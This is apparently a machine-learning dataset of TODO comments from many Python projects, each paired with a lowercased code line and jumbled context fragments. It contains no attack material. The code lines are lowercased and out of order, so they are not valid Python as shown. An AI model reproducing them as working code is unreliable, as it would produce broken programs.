# todo: more arguments possible: objectdb etc. </s> except gitcommanderror as e:	__init__ try: Repo.clone_from(url, path) datalad.log.lgr.error(str(e)) raise
# todo: t196619 </s> return false	set_namespace 'It will be a Breaking Change, please update your code ' 'ASAP, due date July, 31st 2019.', FutureWarning, 2) if isinstance(namespaces, basestring): namespaces = namespaces.split('|')
# end todo </s> x = unfold_func(module)(module.input0)	weight_diag_ggn sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_features) sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_channels, out_x * out_y) X = X.repeat(num_classes, 1, 1) sqrt_ggn = einsum('bml,bkl->bmk', (sqrt_ggn, X)).contiguous()
# todo: change to 'internal cat' (issue 1013) </s> b.add('__cat', enum_name='cat')	_Init b.Add(name) b.Add('push-registers', enum_name='push_registers')
#! todo: consider making linestyle configurable </s> def nichols_grid(cl_mags=none, cl_phases=none):	nichols_grid Usage =====
# todo: convert to utils.retry </s> retry = true	_flock flag |= fcntl.LOCK_NB timeout_end = None while retry: try:
# todo: can cause an endless loop for single track repeat. </s> self.next()	next elif not result: self.core.tracklist.mark_unplayable(next_tl_track) else: self.stop()
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, n=5):	_impl return hpat.hiframes.pd_dataframe_ext.head_dummy(df, n)
# todo: may test with codecs.open passing an encoding </s> with open(self.filename) as fobj:	test_import_from_csv_fobj def test_import_from_csv_fobj(self): table = rows.import_from_csv(fobj, encoding=self.encoding) self.assert_expected_table(table)
# todo(hub-cap): turn this into middleware </s> context = context.reddwarfcontext(	create auth_tok=req.headers["X-Auth-Token"], tenant=tenant_id)
#todo - is there a nice way to return an interator and </s> try:	emboss_piped_AlignIO_convert child.stdin.close() child.stderr.close() aligns = list(AlignIO.parse(child.stdout, new_format)) except Exception, err:
#todo: use universe / ag that </s> self.ag[:4].dihedral	time_dihedral size 4.
# todo: verify </s> mass = elem.mass()	build_Mgg Mbb[j1, j1] = Mbb[j1+1, j1+1] = mass / 2 elif etype in ['CBAR', 'CBEAM']: nid1, nid2 = elem.nodes i1 = dof_map[(nid1, 1)]
# todo: for some reason this test used non-stadard slashing parameters (#354) </s> deployment_parameters[1] = 300	test_all alice1_balance = token.functions.balanceOf(alice1).call() deployment_parameters = list(slashing_economics.deployment_parameters) deployment_parameters[3] = 2 algorithm_sha256, base_penalty, *coefficients = deployment_parameters
# todo(higumachan): remove this "if" section after tensorflow supports python 3.7. </s> if not _available:	test_keras_pruning_callback_observation_isnan def test_keras_pruning_callback_observation_isnan(): pytest.skip('This test requires keras ' 'but this version can not install keras(tensorflow) with pip.')
# todo: add attachements to test notebook </s> from zim.fs import dir	testMultiFile def testMultiFile(self): folder = self.setUpFolder('multi', mock=tests.MOCK_ALWAYS_REAL) exporter = build_notebook_exporter(Dir(folder.path), 'html', 'Default.html')
# xxx todo </s> return address, size	input_address_range size    = None
# todo: use actual github clone string used by github </s> clone='git://github.com/%s.git' % full_name,	addhook login=g.user.login, full_name=full_name, is_github=True )
# todo: dump to file </s> path = self.path.format(**params)	open return self._params.update(params) today = datetime.datetime.now() path = today.strftime(path)
)  # todo(unilight): is changing to ilens_ds_st right? </s> loss = loss + enc_dec_attn_loss	forward enc_dec_attn_loss = self.attn_criterion( att_ws, ilens_ds_st, olens_in report_keys += [{"enc_dec_attn_loss": enc_dec_attn_loss.item()}] if self.use_scaled_pos_enc:
#ack = self.serial_port.read() # todo: use ack </s> self.sendcommand(133) # 10000101	SetMotorCW def SetMotorCW(self):
# todo: does this need to be smarter? </s> indexedtokens["until"] = "%st000000" % (until,)	validateComponentsForCalDAV log.debug("Fixing mismatch") if dtType is datetime.datetime: else: indexedTokens["UNTIL"] = until[:8]
# todo: how to check it? meybe we can omit this test </s> pass	test_gausianfill def test_gausianfill():
# @todo: resolve makedeps in case if it was specified by provides, </s> print('{} {} {}:'.format(	_install_repo_deps all_deps_to_install.remove(dep_name) if all_deps_to_install: color_line('::', 13), "Installing repository dependencies for",
# todo: figure out way to paramaterize node['osds'] for this test </s> for osd in node["osds"]:	test_osd_services_are_enabled def test_osd_services_are_enabled(self, node, Service): assert Service("ceph-osd@%s" % osd).is_enabled
# @todo: also add 'clear' button to clear all elements & start from a blank slate </s> stable = current.s3db.event_scenario	event_rheader editable = current.auth.s3_has_permission("UPDATE", "event_incident", record_id) if editable and r.method == "plan": query = (stable.incident_type_id == incident_type_id) & \ (stable.deleted == False)
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_convert = p_operation.add_parser( "convert", help="convert VGM to PCM using OPL hardware")
# todo: confirm necessity of this session clearing and lay out mechanics. </s> tuf.download._sessions = {}	test_https_connection try: os.environ['REQUESTS_CA_BUNDLE'] = bad_cert_fname logger.info('Trying HTTPS download of target file: ' + bad_https_url) with self.assertRaises(requests.exceptions.SSLError):
# todo: is this required for a visual operation? </s> vi_cmd_data['motion_required'] = false	vi_big_u def vi_big_u(vi_cmd_data): vi_cmd_data['motion']['command'] = 'no_op' vi_cmd_data['motion']['args'] = {}
return none  # todo better error handling here </s> session_dict = response.json()	get_authenticated_user except Exception, e: log.error(e) if u'error' in session_dict: log.error("Error when getting authenticated user: %s" % session_dict['error'])
# todo: why the reverse order? </s> rotatef(rotz, 0, 0, 1)	rotate def rotate(rotx, roty, rotz): rotatef(roty, 0, 1, 0) rotatef(rotx, 1, 0, 0)
# todo remove this in a future version </s> if logfile == 'syslog':	_setup_logging backups = getattr(config, '%s_logfile_backups' % channel) to_syslog = getattr(config, '%s_syslog' % channel) warnings.warn("Specifying 'syslog' for filename is deprecated. " "Use %s_syslog instead." % channel, DeprecationWarning)
# todo: remove in v8 </s> if not isinstance(self.config['deploy_commands'], dict):	__init__ utils.LOGGER.error("Punycode of {}: {}".format(_bnl, _bnl.encode('idna'))) sys.exit(1) utils.LOGGER.warn("A single list as DEPLOY_COMMANDS is deprecated.  DEPLOY_COMMANDS should be a dict, with deploy preset names as keys and lists of commands as values.") utils.LOGGER.warn("The key `default` is used by `nikola deploy`:")
# todo: it would be nice to be async about this. set 1 second timeout. </s> try:	dot_versioncheck 'version': bayeslite.__version__ } r = requests.post(SERVICE, data=payload, timeout=1) if r.status_code == 200 and r.json.result != "current":
# todo: find a way to make the reduction only once, so we don't need to clone. </s> value = value.clone() if is_dist_initialized else value	Result if sync_dist and isinstance(value, (torch.Tensor, numbers.Number)): is_dist_initialized = torch.distributed.is_available() and torch.distributed.is_initialized() value = sync_fn(value, group=sync_dist_group, reduce_op=sync_dist_op) if 'meta' not in self:
# todo: checks for being not outside of this repository </s> out.append(exists(target_path) and '.git/annex/objects' in target_path)	file_has_content if islink(filepath):                    # if symlink target_path = realpath(filepath)    # find abspath of node pointed to by symlink else: out.append(False)
# todo: i can't manage the import issue, can you? </s> new_args, new_kwargs, new_type = sy.frameworks.torch.hook_args.hook_function_args(	handle_func_command except AttributeError: pass cmd, args, kwargs )
if self._ndim == 3: # todo: use hasz </s> array = c_double * 3	ctypes def ctypes(self): if not self._ctypes_data: self._ctypes_data = array(self.x, self.y, self.z) else:
# todo: something a bit less heavy than eval </s> terms = eval(terms)	run if isinstance(terms, basestring): if '{' or '[' in terms: terms = [ terms ] return flatten(terms)
# todo: replace xrange (could fail with 32-bit python 2.x). </s> count = sum(bit_count[self._datastore.getbyte(i)] for i in xrange(self._datastore.bytelength - 1))	count count = bin(self._getuint()).count('1') return count if value else self.len - count if self._offset: count -= BIT_COUNT[self._datastore.getbyte(0) >> (8 - self._offset)]
# todo: verify set_fields </s> return self.set_field(vlan_vid=valve_of.vid_present(vlan_vid))	set_vlan_vid ryu.ofproto.ofproto_v1_3_parser.OFPActionSetField: set VID with VID_PRESENT.
# todo: handle external images </s> path.parent.mkdir(parents=true, exist_ok=true)	save path = path or Path(f"images/{template.key}/{lines}.jpg")
# @todo: copy relevant parts of translate toolkit internally to avoid external dependencies </s> from translate.convert.csv2po import main as csv2po	merge_pootle return from tempfile import NamedTemporaryFile ret = self.merge_strings(ret[0], ret[1], preference) S = Strings()
# todo: remove this asap. </s> _dict['license'] = self.license.title if self.license else _dict.get('license_id', '')	as_dict def as_dict(self): _dict = DomainObject.as_dict(self) _dict['tags'] = [tag.name for tag in self.tags] _dict['groups'] = [group.name for group in self.groups]
# todo: recursive </s> converted_args[key] = arguments_annotations[key](**value)	convert_args for key, value in args.items(): if getattr(arguments_annotations[key], IS_STRAWBERRY_INPUT): else: converted_args[key] = value
# todo: should actually be implemented by annexrepo </s> exitcode, (out, err) = \	_get_file_key def _get_file_key(self, file): self.runner(['git', 'annex', 'lookupkey', file], return_output=True, cwd=self.path)
# todo consolidate to base class </s> self._post_event_queue.put((dispatcher, event, args))	post_event def post_event(self, dispatcher, event, *args): if not self._running: return
# todo: check that body contains link to dashboard and email prefs. </s> assert encoded_body in email[3]	test_02_one_new_activity "You have new activity", "Sara Rollins")
# todo - log details about the test </s> return result	check_svip_connection test = self.sfe.test_connect_svip(svip=self.svip) result = test.details.connected except: err = get_exception()
# avdn: todo </s> self.format_raises(valueerror, format_spec, 0.0)	test_format_float format_spec = '{:' + format_spec + '}'
# todo: also deal with empty directories </s> local_files = self._list_local_files_with_info(cmd["source_paths"])	_cmd_upload def _cmd_upload(self, cmd): completed_files_size = 0 target_dir = cmd["target_dir"] assert target_dir.startswith("/") or not self._supports_directories()
# todo: replace by plugins_info.move_to_end('coretasks') for python 3 </s> core_info = plugins_info.pop('coretasks')	get_usable_plugins (plugin.name, (plugin, is_enabled)) for plugin, is_enabled in enumerate_plugins(settings)) plugins_info['coretasks'] = core_info return plugins_info
# todo(tsileo): also update following (it's in the object) </s> _cache_actor_icon(actor)	update_cached_actor ), )
raise mpdnotimplemented # todo </s> def _tagtypes(self):	_tagtypes @register(r'^tagtypes$')
# todo: implement versioning on all subclasses </s> pass	target def target(self):
# todo: avoid using default index? </s> with option_context("compute.default_index_type", "distributed-sequence"):	compare_values def compare_values(): return ( self.to_series().rename("self").to_frame().reset_index()['self'] ==
# todo: update the tolerance after the ci moves to torch 1.10 </s> self.asserttrue(torch.allclose(outputs.logits[:, :4], expected_logits, atol=1e-2))	test_inference_diarization self.assertEqual(labels[0, :, 0].sum(), 270) self.assertEqual(labels[0, :, 1].sum(), 647)
# todo: check nd reply is valid </s> self.asserttrue(self.packet_outs_from_flows(nd_replies))	nd_for_controller 'ipv6_dst': str(ip_gw_mcast), 'neighbor_solicit_ip': str(dst_ip)})
# todo: test with ion/ioff </s> frame_width = getattr(cmd, "frame_width", none)	_check_add_matplotlib_info if (type(value).__name__ == "Figure" and type(value).__module__ == "matplotlib.figure"): frame_height = getattr(cmd, "frame_height", None) if frame_width is not None and frame_height is not None:
# todo bind a log_cb to this config ^^ </s> self.meta = rd_kafka.producer(config).metadata()	update def update(self): config = {"metadata.broker.list": self.seed_hosts} self._refresh_no_clobber(self.brokers, self.meta["brokers"], Broker) self._refresh_no_clobber(self.topics, self.meta["topics"], Topic)
# todo 0.24: raise a valueerror instead of a warning </s> warnings.warn(	_BaseKFold " got {0}".format(shuffle)) if not shuffle and random_state is not None:  # None is the default 'Setting a random_state has no effect since shuffle is ' 'False. This will raise an error in 0.24. You should leave '
# todo[k]: remove when t853 is properly fixed. </s> def test_draft_deletes_include_version(api_client):	test_draft_deletes_include_version ts = int(time.time()) cursor = get_cursor(api_client, ts)
sort_by = none if 'sort_by' not in parameters else parameters['sort_by'][0]  # todo check integer! </s> sort_asc = true if 'sort_asc' not in parameters else bool(int(parameters['sort_asc'][0]))	ChannelsEndpoint first = 1 if 'first' not in parameters else int(parameters['first'][0])  # TODO check integer! last = 50 if 'last' not in parameters else int(parameters['last'][0])  # TODO check integer! query_filter = None if 'filter' not in parameters else parameters['filter'][0] if query_filter:
# todo: use widgets.dialog </s> id = wx.messagedialog(self._editor,	_handle_sanity_check_failure def _handle_sanity_check_failure(self): 'ERROR: Data sanity check failed!\n'\ 'Reset changes?',
#todo: search recursively under stage.path instead of only within </s> installlog = join_path(package.stage.source_path, 'spack-build.out')	testinstall installLog = spack.install_layout.build_log_path(spec) else: with open(installLog, 'rb') as F: for line in F.readlines()[:10]:
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo: empty. </s> expected = (	test_proxy_representation def test_proxy_representation(): Proxy(Simple.x): one
# todo(brett.cannon) implement </s> raise importerror	_default_hook def _default_hook(self, path): If the path will not work for the default hook then raise ImportError.
# todo - diff </s> self.client.logout()	testReviewDetail2 self.assertEqual(request.bugs_closed, '1234, 5678, 8765, 4321') self.assertEqual(request.status, 'P')
# @todo: set metadata on file: org, location, disaster, date </s> s3sqlinlinecomponent("document",	customise_project_project_resource fields = ["organisation_id"], ), name = "concept_note", label = T("Concept Note"),
# todo: call out to the ceph cluster to check the </s> self._delete(cluster_id, pool_id)	xtest_create_args_ec "pool[%s]!=%s (actually %s)" % (var, val, pool[var]))
pass  # todo(nnorwitz): impl </s> return file_uses, decl_uses	_DetermineUses pass  # TODO(nnorwitz): impl elif isinstance(node, ast.Union) and node.body is not None:
# todo: handle situations where share is password protected </s> path = string.replace(path,'/', '\\')	retr_file def retr_file(self, shareName, path, callback, mode = FILE_OPEN, offset = 0, password = None): path = ntpath.normpath(path) if len(path) > 0 and path[0] == '\\':
raise  # todo: what if our seed node fails verification? </s> return potential_seed_node	learn_from_seednode potential_seed_node.verify_node(self, accept_federated_only=accept_federated_only) except potential_seed_node.InvalidNode:
#todo: handle common wiki templates for type guessing </s> if node.name == 'refn':	_read_field def _read_field(self, node): if isinstance(node, Template): return '' return ' '.join([ str(p) for p in node.params ])
# todo make more robust (timeout low? server returns error?) </s> await asyncio.wait_for(self.network.broadcast_transaction(funding_tx), ln_p2p_network_timeout)	LNWallet self.network.trigger_callback('channels_updated', self.wallet) if funding_tx.is_complete(): return chan, funding_tx @log_exceptions
# todo: verify </s> manager.unregistered(self.consumer_id)	test_unregistered manager = factory.consumer_agent_manager()
# todo: test without file </s> def test_impl():	test_nunique_str_parallel def test_nunique_str_parallel(self): df = pq.read_table('example.parquet').to_pandas() return df.two.nunique()
# todo: error handling </s> try:	get_or_create_author def get_or_create_author(olkey): author = Author.objects.get(openlibrary_key=olkey) except ObjectDoesNotExist:
# todo: look this up in one query </s> for user_id in p.collaborator_ids:	_playlist_resultset_to_model p.collaborator_ids = playlist_collaborator_ids.get(p.id, []) collaborators = [] user = db_user.get(user_id) if user:
# todo also check for motion codec parameter support </s> return 'h264_qsv' in codecs.get('h264', {}).get('encoders', set())	has_h264_qsv_support if not binary: return False
# todo(phawkins): we currently set dtype=false because we aren't as </s> tol_spec = {onp.float32: 2e-4, onp.float64: 5e-6}	testMedian return onp.median(*args, axis=axis, keepdims=keepdims) jnp_fun = partial(jnp.median, axis=axis, keepdims=keepdims) tol = jtu.tolerance(a_dtype, tol_spec) self._CheckAgainstNumpy(onp_fun, jnp_fun, args_maker, check_dtypes=False,
# todo: order of attributes is not assured; allow for any order. </s> match1 = '<words default-y="45.0" font-weight="bold" justify="left">super fast</words>'	testExportMetronomeMarksD p.repeatAppend(note.Note('g#3'), 8) p.insert(0, tempo.MetronomeMark('super fast', number=222.2)) match2 = '<per-minute>222.2</per-minute>' raw = fromMusic21Object(p)
# todo(john sirois): this hacks around a direct but undeclared dependency </s> with subsystem_instance(jvm):	test_exported_antlr module='exported', provides=PythonArtifact(name='test.exported', version='0.0.0.')) with self.run_execute(target) as created: self.assertEqual([target], created)
# todo: what about '_type'? </s> }	_build_event_api_data 'visibility': Conversion.visibility(event.as_legacy), 'folders': build_folders_api_data(event) detail = get_query_parameter(request.args.to_dict(), ['d', 'detail']) if detail == 'contributions':
#todo: check login_required? </s> if( ( trans.user == none )	get_history_dataset_association_from_ids def get_history_dataset_association_from_ids( self, trans, id, history_id ): and ( history_id == trans.security.encode_id( trans.history.id ) ) ): history = trans.history
# todo discont: use offsets instead (note need for int conversion) </s> if (int(start) != tb_ann.start or int(end) != tb_ann.end):	_edit_span undo_resp['offsets'] = tb_ann.spans[:] undo_resp['type'] = tb_ann.type if not isinstance(tb_ann, TextBoundAnnotation):
# todo(juice): maybe it would be ok to extend the test to validate </s> when(db_models.databasemodelbase).find_by(	test_check_for_heartbeat_negative def test_check_for_heartbeat_negative(self): instance_id=any()).thenReturn('agent') when(agent_models.AgentHeartBeat).is_active(any()).thenReturn(False)
# todo: remove summary when bug 862603 lands. </s> more['summary_%s__text' % analyzer] = {	name_query more['description_%s__text' % analyzer] = { 'query': q, 'boost': 0.6, 'type': 'phrase', 'analyzer': analyzer} 'query': q, 'boost': 0.1, 'type': 'phrase', 'analyzer': analyzer} return dict(more, **name_only_query(q))
# todo: assert metrics. </s> metrics = code_analysis_server.metrics(	test_get_metrics error = repository.get_metrics(commit, metrics["spaces"]) assert not error "file.js", function func() {
# todo: this currently aligns based on phrases, not words </s> spans = [c] if isinstance(c, temporaryspan) else c.get_arguments()	get_vert_aligned_ngrams def get_vert_aligned_ngrams(c, attrib='words', n_min=1, n_max=1, lower=True): for span in spans: if span.sentence.table is None: continue
# todo: why do we have the --branch and --single-branch tags here, this causes problems </s> run('git clone --depth=1 --branch %s --single-branch %s .' % (env.git_tag, env.git_repo_url))	build run('mkdir -p %s' % src_dir) with cd(src_dir): configuration = DeploymentConfig(env.cfg_label, env.cfg_path) dep = Deployment(configuration)
fname = fnames[0]  # todo handle multiple notebooks </s> head_version_show = subprocess.popen(	get_modified_files output = subprocess.check_output("git ls-files --modified".split()) fnames = output.splitlines() ['git', 'show', 'HEAD:' + fname], stdout=subprocess.PIPE
# todo: remove hardcoded http </s> protocol = 'http'	send_campaign_email_subscriber 'campaign_uuid': email.campaign.uuid }) unsubscribe_absolute_url = '%s://%s%s' % (protocol, site.domain, path) context = {
# todo: obtain path lock or make operation atomic in sqlite </s> self.state_store.set_deleting(path)	_delete_path def _delete_path(self, path): self.api.delete(path) self.state_store.set_deleted(path)
# todo: set content_length </s> self._content_type = data['_content_type']	_perform_method_overloading self._stream = io.BytesIO(data['_content'].encode('utf8'))
# @todo: build better caption rather than just using raw comments </s> caption = description = row.comments or ""	inv_timeline send_date = send_date.isoformat() recv_date = recv_date.isoformat() link = URL(args = [row.id]) eappend({"start": send_date,
# todo: use different flag than .reentrant </s> if colorsorter._relative_transforms():	schedule_triangle_strip appropriate. if ColorSorter._parent_csdl and ColorSorter._parent_csdl.reentrant: ColorSorter._warn_transforms_nim("schedule_triangle_strip") ColorSorter.schedule(color, drawtriangle_strip_worker,
# todo: write the wavelet transform </s> w_n = self.wavelet_transform	reconstruction C_d = self.C_d Y_0 = self.wavelet s = np.expand_dims(self.scales, 1) real_sum = np.sum(W_n.real / s ** .5, axis=0)
# todo: automate this (by lookup from nn). </s> internal_states_space=impalaagent.standard_internal_states_space,	test_impala_actor_plus_learner_agent_functionality_actor_part state_space=env.state_space, action_space=env.action_space, execution_spec=dict( mode="distributed",
# todo render mock data before response, support more functions </s> params = {	get_matched_data if self._is_match_rule(flow, _data.get('rule')): _matched_data.append(_data) 'ip': config.get('ip'), 'port': config.get('mock.port')
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: trigger via dummy audio? </s> self.playback.on_about_to_finish()	trigger_about_to_finish def trigger_about_to_finish(self): self.audio.prepare_change()
# todo: reformat or delete </s> camera.trackbodyid = 0	sawyer_xyz_reacher_camera def sawyer_xyz_reacher_camera(camera): camera.distance = 1.0 cam_dist = 0.3
# todo: fire_switch_state_change(self, channel_index, old_switch_state, switch_state, from_myself) </s> elif namespace == report:	_handle_push_notification for sensor in payload['togglex']: self._update_client_data(sensor) pass elif namespace == HUB_MODE:
# todo: rewrite tests </s> pass	test_resend_confirmation_get def test_resend_confirmation_get(self):
# todo: the following was copy/pasted from the histogram viewer, maybe </s> self.plot_artist.set_visible(false)	_calculate_profile_postthread else:
#@todo: remove in 0.4.10 </s> def _log(self, level, plugintype, pluginname, messages):	_log return super(self.__name__, self)._log(level, plugintype, pluginname.replace("Hook", ""), messages)
# todo: will removed when django 1.7 will be deprecated </s> else:	_remove_hstore_virtual_fields fields = [f for f in cls._meta.fields if not hasattr(f, 'hstore_field_name')] cls._meta.fields = cls._meta.fields.__class__(fields) for meta_fields in ['fields', 'local_fields', 'virtual_fields']: hstore_fields = []
# todo: bytes vs str </s> l = l.decode()	parse_headers if l == b"\r\n": break k, v = l.split(":", 1) headers[k] = v.strip()
# todo what happens with the background thread here? </s> self.reconnect(new_dc=e.new_dc)	invoke 'attempting to reconnect at DC {}' .format(e.new_dc)) return self.invoke(request) except ConnectionResetError:
# todo: remove when transition to python3 complete </s> return frd(self.fresp/other.fresp, self.omega)	__truediv__ "FRD.__truediv__ is currently implemented only for SISO systems.")
body = {}  # todo: not clear what this is supposed to be </s> return self._try(self._monitors.update, job_id, body, **params)	monitors_update def monitors_update(self, job_id, **params):
# todo: enable once there's a user.avatar property returning a wrapper with avatar-style methods </s> self.user.favorite_categories.add(category)	_process_PUT category = CategoryManager().getById(request.view_args['category_id']) if category not in self.user.favorite_categories: if redis_write_client: suggestions.unignore(self.user, 'category', category.getId())
# todo this might not cover all cases </s> if 'condition' in statement and \	_set_s3_bucket_secure_transport bucket['secure_transport_enabled'] = False for statement in bucket['policy']['Statement']: 'Bool' in statement['Condition'] and \ 'aws:SecureTransport' in statement['Condition']['Bool'] and \
# todo: for backward compatibility only, remove if not used anymore </s> def get_vm_id(self):	get_vm_id return get_vm(key='id')
# todo do a check for the flip condition </s> if allow_flip:	add_point_inside_simplex self.add_simplex(tri) new.append(tri) self.flip_if_needed(others) return(new)
# todo: wait for an event instead of spinning. </s> while not (self._prev_whdr.dwflags & whdr_done):	sync if not self._prev_whdr: return time.sleep(0.005) res = winmm.waveOutUnprepareHeader(self._waveout, LPWAVEHDR(self._prev_whdr), sizeof(WAVEHDR))
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_punpcklwd x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo: add and store preprocessing errors. </s> logging.error('unable to decode user directory.')	_ParseFileData user_directory = row[5].decode('utf-8') except UnicodeDecodeError: shell = None if row[6]:
# todo: check if integerctype, not just ctype.arith (floats, etc.) </s> if (left.ctype.type_type == ctype.pointer and	BinaryOperatorNode return self.make_nonarith_equality_code(left, right, il_code) elif self.operator.kind == token_kinds.plus: right.ctype.type_type == CType.ARITH): arith_op, pointer_op = right, left
# todo: add standard commands </s> def add_handler(cmd):	create_menus def create_menus(self): action = cmd.action def handler(sender, event):
oldsize = self.size # todo: remove </s> assert type(self.body) in (str, list), '%s: %s' % (self.type, type(self.body))	Atom atom.write(stream) def calsize(self): if type(self.body) == str: pass
# todo(seemuch): remove this contrib import </s> optimizer = tf.contrib.tpu.crossshardoptimizer(optimizer)	neumf_model_fn epsilon=params["epsilon"]) if params["use_tpu"]: mlperf_helper.ncf_print(key=mlperf_helper.TAGS.MODEL_HP_LOSS_FN, value=mlperf_helper.TAGS.BCE)
# todo: allow_stderr_warning is used for the --build deprecation, </s> allow_stderr_warning=true,	test_no_clean_option_blocks_cleaning_after_install '--find-links={}'.format(data.find_links), 'simple', expect_temp=True, ) assert exists(build)
# todo: this property is only used by the mvpformindicatorpillow </s> instance.initial_processing_complete = true	process_xforms_for_cases domain=domain, ) cases = case_db.get_cases_for_saving(now) bulk_save_docs(xforms + cases, instance)
# todo: stderr=_stderr_file, </s> shell=false,	start cmd, pass_fds=[wfd], ) else:  # no has_displayfd
# todo(dave) implement </s> if project.id is none:  # dummy logic, dummy code	enforce def enforce(self, project): raise exception.QuotaReached(project_id=project.external_id, resource_type=self.resource_type,
# todo: replace with copy and copy_file </s> cmd = "cp -a '" + source + "' '" + target + "/'"	_copy_dir_content def _copy_dir_content(source, target): Copies the contents of a dir to a specified target path. sp.run(cmd, shell=True, stdout=sp.PIPE)
# todo no need for .view(1, -1) </s> score = self.start_transitions.view(1, -1) + emissions[0]	_compute_normalizer seq_length = emissions.size(0) mask = mask.float() for i in range(1, seq_length): broadcast_score = score.unsqueeze(2)
else fn)  # todo: change to jscommand </s> return self	set_value fn.__str__ = lambda: f'set value: {value}'  # todo: refactor to pass description in wait.command self.wait.command(fn if self.config.set_value_by_js
# todo: consider adding some better error handling for bad/failed requests. </s> _log_response("km", {'email': email, 'properties': properties}, res)	_post_func res = km.set(email, properties)
# todo: remember that we are now out of sync and try again </s> logger.warn(	_handle_device_updates result = yield self.federation.query_user_devices(origin, user_id) except NotRetryingDestination: "Failed to handle device list update for %s," " we're not retrying the remote",
# todo test cachetag </s> assert list(fieldnames(result)) == ['spong', 'bar']	test_rename result['foo'] = 'spong'
# todo: remove this ``expectedfailure`` </s> list(user.objects.all())	test_successful_nested_read_atomic list(Test.objects.all())
# todo(stephenfin): fix these various bugs in a follow-up </s> if table_name == 'volume_usage_cache' and column.name == 'user_id':	_create_shadow_tables ) column_copy = sa.Column(column.name, enum) column_copy = sa.Column('user_id', sa.String(36))
# todo: hack: this is papering over a bug elsewhere. </s> fullname = fullname.rstrip('.')	find_module return None _tls.running = True try: pkgname, dot, _ = fullname.rpartition('.')
# todo check if lus can be more than one token </s> tag = 'b-lu' if lemma == annotations['lu'] else 'o'	process_sentence processed = list() for token, pos, lemma in lines: processed.append([ sentence_id, str(sentence_id), token, pos, lemma, annotations['frame'], tag
# todo: somehow caused by circular import under python3 refactor </s> if sys.version_info > (3, 0):	startServer web.helper.global_WorkerThread.stop() sys.exit(1) self.restart = web.py3_restart_Typ if self.restart == True:
# todo: remove one day </s> if bigquery_conn_id:	BigQueryHook location: Optional[str] = None, bigquery_conn_id: Optional[str] = None) -> None: warnings.warn( "The bigquery_conn_id parameter has been deprecated. You should pass "
# todo uncomment the actual test below after we have implemented the l1 attack </s> norm=1, **self.attack_param)	test_targeted_adv_example_success_rate_l1 NotImplementedError, self.help_targeted_adv_examples_success_rate,
raise notimplementederror # todo </s> def remove(self, item):	remove
# todo: handle marker? </s> for func in funcs['functions']:	_find_function conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile) funcs = conn.list_functions() if func['FunctionName'] == name: return func
# todo: remove me when auto_now_add is enabled (post-migration) </s> user.date_registered = dt.datetime.utcnow()	test_create username=email, password='foobar', fullname=name ) user.save() assert user.check_password('foobar') is True
# todo: scale and translation could be merged into a single network </s> with tf.variable_scope("scale"):	forward_and_jacobian mask = self.get_mask(inputs, dtype=inputs.dtype) masked_inputs = inputs * mask scale = self.scale_fn(masked_inputs) with tf.variable_scope("translation"):
# todo add stuff from will's pull req </s> if error:	blockchain_check_conditions_dict elif cvp.opcode is ConditionOpcode.ASSERT_BLOCK_AGE_EXCEEDS: error = blockchain_assert_block_age_exceeds(cvp, unspent, header) return error return None
pass # todo </s> def test_export(self):	test_export
# # fixme: # todo: remove me </s> try:	unpack_url faup.decode(url) url_unpack = faup.get() to_crawl['domain'] = url_unpack['domain'].decode() except:
# todo: once per second, reinspect any projects marked dirty. </s> '-outputdir', module_inspector_obj_dir])	run '-o', MODULE_INSPECTOR_EXE_PATH,
# todo: finish this. </s> pass	unlink def unlink(self, path):
# todo: test for first revision on last page. </s> offset = url_for(controller='revision', action='list')	test_list_long self.create_100_revisions() try: res = self.app.get(offset) self.assert_click(res, '2', 'Revision 2')
assert study_id == 0  # todo(akiba) </s> trial_id = len(self.trials)	create_new_trial_id def create_new_trial_id(self, study_id): self.trials.append(trial.Trial(trial_id)) return trial_id
# todo: let users specify a base mac address </s> mac = "00:00:ab:%s:%s:%02x" % (self.id[-4:-2], self.id[-2:], adapter_number)	_network_options adapter_number = 0 for adapter in self._ethernet_adapters: if self._legacy_networking: network_options.extend(["-net", "nic,vlan={},macaddr={},model={}".format(adapter_number, mac, self._adapter_type)])
# todo: make an ascii-art bar </s> ctx.fillslots("progress_hash", "%.1f%%" % (100.0 * chk))	render_row_upload self._render_common(ctx, data) (chk, ciphertext, encandpush) = data.get_progress() ctx.fillSlots("progress_ciphertext", "%.1f%%" % (100.0 * ciphertext)) ctx.fillSlots("progress_encode", "%.1f%%" % (100.0 * encandpush))
return self.name # todo: probably we should raise an exception here </s> except exception:	richText return pattern.DocumentRange.GetText(-1)
# todo: proper content negotiation </s> data = request.get_json()	validate_payload validate = func.__apidoc__.get('validate', False) if model and validate and hasattr(model, 'validate'): model.validate(data, self.api.refresolver)
# todo: make it really async. </s> self.database_name = database_name	__init__ self.server_name = server_name
# todo: break this tuplet stuff into a helper function shared for <note>, <rest>, and <chord> </s> if elem.get('m21tupletsearch') is not none:	chordFromElement if duration.convertTypeToNumber(post.duration.type) > 4: post.beams.fill(post.duration.type, elem.get('m21Beam')) post.m21TupletSearch = elem.get('m21TupletSearch') post.m21TupletNum = elem.get('m21TupletNum')
# todo: validate triplet of states </s> if not indices and not main_complex:	extrinsic_events Returns: events (tuple(actions)): List of true events in the main complex main_complex = compute.main_complex(network, current_state) elif not main_complex:
# todo: check if format matches </s> pass	_envelope_job if file_format['outputFormat'] == 'table': if file_format['isTargetExisting']: else: sql = SQLIndexer(user=request.user, fs=request.fs).create_table_from_a_file(source, destination).get_str()
# todo: make this cleaner/faster </s> output_list = p_out.split('\n')	tag_file_example print(cp_err) raise output_list_filtered = [l for l in output_list if not l.startswith('loading the models')] output_list_filtered = [l for l in output_list_filtered if not l == 'done']
